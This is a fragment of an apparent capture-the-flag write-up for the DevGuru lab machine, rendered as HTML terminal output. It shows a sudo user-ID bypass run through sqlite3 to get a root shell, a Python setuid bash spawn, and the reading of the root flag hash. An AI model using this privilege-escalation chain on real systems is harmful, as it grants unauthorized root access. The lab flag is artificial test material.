+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@devguru:~/gitea-repositories/s4rgaz/test.git<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 sqlite3 /dev/null '.shell /bin/sh'</span>
+&lt;.git<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 sqlite3 /dev/null '.shell /bin/sh'</span>
+<span class="c"># id</span>
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>frank<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>frank<span class="o">)</span>
+<span class="c"># python3 -c "import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"</span>
+python3 <span class="nt">-c</span> <span class="s2">"import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"</span>
+
+root@devguru:~/gitea-repositories/s4rgaz/test.git# <span class="nb">cd</span> /root
+<span class="nb">cd</span> /root
+root@devguru:/root# <span class="nb">ls
+ls
+</span>msg.txt  root.txt
+root@devguru:/root# <span class="nb">cat </span>msg.txt
+<span class="nb">cat </span>msg.txt
+
+           Congrats on rooting DevGuru!
+  Contact me via Twitter @zayotic to give feedback!
+
+
+root@devguru:/root# <span class="nb">cat </span>root.txt
+<span class="nb">cat </span>root.txt
+96440606fb88aa7497cde5a8e68daf8f
+</code></pre></div></div>
+
+:ET
